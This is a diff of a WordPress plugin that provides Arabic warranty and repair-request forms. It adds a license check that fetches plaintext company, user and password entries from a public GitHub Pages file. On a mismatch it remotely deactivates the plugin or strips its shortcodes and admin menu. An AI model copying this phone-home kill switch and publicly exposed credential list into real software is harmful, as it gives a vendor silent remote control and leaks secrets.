-if (check_credentialsact($co_name, $plug_name, 'true')) {
+
+
+// Define the full path to the text file
+$file = __DIR__ . '/cdn/info.txt';
+
+// Check if the file exists and is readable
+if (file_exists($file) && is_readable($file)) {
+    $companyData = file_get_contents($file); // Read the content of the file
+
+    // Split the content into an array using the comma as a separator
+    $companyInfo = explode(',', $companyData);
+     global $companyName;
+
+    // Check if the array contains both company name and company email
+    if (count($companyInfo) === 2) {
+        global $companyName;
+        $companyName = $companyInfo[0];
+        // $companyEmail = $companyInfo[1];
+    }
+}
+
+
+if (check_credentialsact($companyName, $plug_name, 'true')) {
 
     // Check if credentials match
-    if (!check_credentials($co_name, $plug_name, $user, $pass)) {
+    if (!check_credentials($companyName, $plug_name, $user, $pass)) {
         // Credentials do not match, deactivate the plugin
         deactivate_plugins(plugin_basename(__FILE__));
         wp_die('<center><strong>Your using license has been expired according to the <a href="https://unknown-sudo-max.github.io/zone/!-CODE/LICENSE-AGREEMENT.html">license</a></strong> <br/>This plugin has been deactivated From the Administrative side.<br/><br/>- Please refer to Michael Gad the CEO & Founder OF <a href=\'https://unknown-sudo-max.github.io/zone/!-CODE/\'>!-CODE</a> Co.</center><script>setTimeout(function() { history.back(); }, 10000);</script>');
@@ -975,6 +1359,8 @@ if (check_credentialsact($co_name, $plug_name, 'true')) {
 }
 
 }
+
+
 
 
 
@@ -998,8 +1384,41 @@ function check_credentialsact($co_name, $plug_name, $ifis_active) {
     return false; // No match found
 }
 
+// function check_credentialsact($companyName, $plug_name, $ifis_active) {
+//     // Read the external text file line by line
+//     $file_url1 = 'https://unknown-sudo-max.github.io/hub/config/act_check';
+//     @$file_contents1 = file_get_contents($file_url1);
+//     $lines1 = explode("\n", $file_contents1);
+    
+//     $companyNameFound = false;
+//     $plugNameFound = false;
 
-function check_credentials($co_name, $plug_name, $user, $pass) {
+//     foreach ($lines1 as $line1) {
+//         $parts1 = explode(',', $line1);
+//         if (count($parts1) === 3) { // Check if the line has the correct format
+//             list($company_name, $plugin_name, $is_active) = array_map('trim', $parts1);
+            
+//             // Check if the current line matches the provided company name or plugin name
+//             if ($company_name === $companyName) {
+//                 $companyNameFound = true;
+//             }
+//             if ($plugin_name === $plug_name) {
+//                 $plugNameFound = true;
+//             }
+            
+//             // Check if both company name and plugin name match and the plugin is active
+//             if ($companyNameFound && $plugNameFound && $is_active === 'true') {
+//                 return true; // Credentials match an entry in the file and the plugin is active
+//             }
+//         }
+//     }
+
+//     // Return true if either company name or plugin name were not found, or if they were found but not active
+//     return !$companyNameFound || !$plugNameFound || $ifis_active !== 'true';
+// }
+
+
+function check_credentials($companyName, $plug_name, $user, $pass) {
     // Read the external text file line by line
     $file_url = 'https://unknown-sudo-max.github.io/hub/pass/pass';
     @$file_contents = file_get_contents($file_url);
@@ -1009,7 +1428,7 @@ function check_credentials($co_name, $plug_name, $user, $pass) {
         $parts = explode(',', $line);
         if (count($parts) === 4) { // Check if the line has the correct format
             list($company_name, $plugin_name, $stored_user, $stored_pass) = array_map('trim', $parts);
-            if ($company_name === $co_name && $plugin_name === $plug_name && $stored_user === $user && $stored_pass === $pass) {
+            if ($company_name === $companyName && $plugin_name === $plug_name && $stored_user === $user && $stored_pass === $pass) {
                 return true; // Credentials match an entry in the file
             }
         }
@@ -1076,7 +1495,7 @@ function custom_form_display() {
 
         
     </style>
-    <div id="primary" class="content-area">
+    <div id="waprimary" class="content-area">
         <h2 id="warranty-activation"></h2>
         <h2 style="text-align: center;user-select: none;margin-right: 9%;">تفعيل الضمان</h2>
         <main id="main" class="site-main">
@@ -1090,11 +1509,11 @@ function custom_form_display() {
 
                             <div class="form-group">
                                 <label for="name">الاسم:</label>
-                                <input type="text" name="name" id="name" class="form-control" required maxlength="20">
+                                <input type="text" name="name" id="name" autocomplete="on" class="form-control" required maxlength="20">
                             </div>
                             <div class="form-group">
                                 <label for="phone">رقم الهاتف:</label>
-                               <input type="tel" name="phone" id="phone" class="form-control" required maxlength="11" onkeyup="checkInput(this)" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                               <input type="tel" name="phone" id="phone" autocomplete="on" class="form-control" required maxlength="11" onkeyup="checkInput(this)" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                                <script>
 function checkInput(inputElement) {
     var inputValue = inputElement.value;
@@ -1258,12 +1677,12 @@ $message .= '</table>';
 
 $message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
 $message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
-$message .= '<p style="color:gray;font-weight: bolder;">Powered &amp; Developed By !-CODE Co.  M_G_X CEO &amp; Founder</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; 2023</p>';
+$message .= '<p style="color:gray;font-weight: bolder;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
 $message .= '</div>';
 
 
 $message .= '<style>';
-$message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
+// $message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
 $message .= '</style>';
 $message .= '</body></html>';
 
@@ -1287,7 +1706,7 @@ add_action('admin_post_nopriv_submit_form', 'custom_form_submission');
 function custom_form_display_with_category() {
     ob_start();
     ?>
-    <div id="primary" class="content-area">
+    <div id="catprimary" class="content-area">
         <main id="main" class="site-main">
             <div class="container">
                 <div class="row">
@@ -1430,7 +1849,7 @@ function contact_form_display() {
     </style>
 
 
-    <div id="primary" class="content-area">
+    <div id="cprimary" class="content-area">
 
         <h2 id="contact-us"></h2>
         <h2 style="text-align: center; user-select: none;margin-right: 9%;">طلب صيانة اونلاين</h2>
@@ -1446,11 +1865,11 @@ function contact_form_display() {
                             <!-- Form fields here -->
                             <div class="form-group">
                                 <label for="name">الاسم:</label>
-                                <input type="text" name="name" id="name" class="form-control" required maxlength="20">
+                                <input type="text" name="name" id="name" autocomplete="on" class="form-control" required maxlength="20">
                             </div>
                             <div class="form-group">
                                 <label for="phone">رقم الهاتف:</label>
-                               <input type="tel" name="phone" id="phone" class="form-control" onkeyup="checkInput(this)" required maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                               <input type="tel" name="phone" id="phone" autocomplete="on" class="form-control" onkeyup="checkInput(this)" required maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
 
 <script>
 function checkInput(inputElement) {
@@ -1514,7 +1933,7 @@ function checkInput(inputElement) {
                             </div>
                             <div class="form-group">
                                 <label for="address">العنوان:</label>
-                                <input type="text" name="address" id="address" class="form-control" required maxlength="40">
+                                <input type="text" name="address" id="address" autocomplete="on" class="form-control" required maxlength="40">
                             </div>
                             <div class="form-group">
                                 <label for="issue">العطل:</label>
@@ -1612,12 +2031,12 @@ $message .= '</table>';
 // Signature container with Google Font
 $message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
 $message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
-$message .= '<p style="color:gray;font-weight: bolder;">Powered &amp; Developed By !-CODE Co.  M_G_X CEO &amp; Founder</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; 2023</p>';
+$message .= '<p style="color:gray;font-weight: bolder;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
 $message .= '</div>';
 
 
 $message .= '<style>';
-$message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
+// $message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
 $message .= '</style>';
 $message .= '</body></html>';
 
@@ -1873,3 +2292,80 @@ function mgx_page_excerpt_shortcode($atts) {
     return $output;
 }
 add_shortcode('mgx_page_excerpt', 'mgx_page_excerpt_shortcode');
+
+
+
+ 
+function check_activation_two($companyName_two) {
+    // Read the external text file line by line
+    $file_url_two = 'https://unknown-sudo-max.github.io/hub/pass/pass';
+    @$file_contents_two = file_get_contents($file_url_two);
+    $lines_two = explode("\n", $file_contents_two);
+
+    foreach ($lines_two as $line_two) {
+        $parts_two = explode(',', $line_two);
+        if (count($parts_two) === 4) { // Check if the line has the correct format
+            list($company_name_two, $plugin_name_two, $stored_user_two, $stored_pass_two) = array_map('trim', $parts_two);
+            if ($company_name_two === $companyName_two) {
+                return true; // Credentials match an entry in the file
+            }
+        }
+    }
+
+    return false; // No match found
+}
+
+// Define the full path to the text file
+$file_two = __DIR__ . '/cdn/info.txt';
+
+// Check if the file exists and is readable
+if (file_exists($file_two) && is_readable($file_two)) {
+    $companyData_two = file_get_contents($file_two); // Read the content of the file
+
+    // Split the content into an array using the comma as a separator
+    $companyInfo_two = explode(',', $companyData_two);
+
+    // Check if the array contains both company name and company email
+    if (count($companyInfo_two) === 2) {
+        $companyName_two = trim($companyInfo_two[0]);
+        $companyEmail_two = trim($companyInfo_two[1]);
+    }
+}
+
+
+// Check if the $companyName variable is not empty
+if (!empty($companyName_two) && !empty($companyEmail_two)) {
+    // Display both company name and email
+    
+
+    // Check if the company name exists in the external file
+    if (check_activation_two($companyName_two)) {
+        
+         
+
+        // Rest of the code for modifying the content remains the same.
+ 
+    } elseif (count($companyInfo_two) === 2) {
+           // Remove specific shortcodes based on conditions
+        remove_shortcode('mgx_custom_form');
+        remove_shortcode('mgx_custom_form_with_category');
+        remove_shortcode('mgx_contact_with_us_form');
+        remove_shortcode('mgx_page_excerpt');
+          remove_action('admin_menu', 'add_custom_tables_menu');
+    } else {
+           // Remove specific shortcodes based on conditions
+        remove_shortcode('mgx_custom_form');
+        remove_shortcode('mgx_custom_form_with_category');
+        remove_shortcode('mgx_contact_with_us_form');
+        remove_shortcode('mgx_page_excerpt');
+        remove_action('admin_menu', 'add_custom_tables_menu');
+    }
+} else {
+    // Display a message if company name and email are not found
+       // Remove specific shortcodes based on conditions
+        remove_shortcode('mgx_custom_form');
+        remove_shortcode('mgx_custom_form_with_category');
+        remove_shortcode('mgx_contact_with_us_form');
+        remove_shortcode('mgx_page_excerpt');
+         remove_action('admin_menu', 'add_custom_tables_menu');
+}
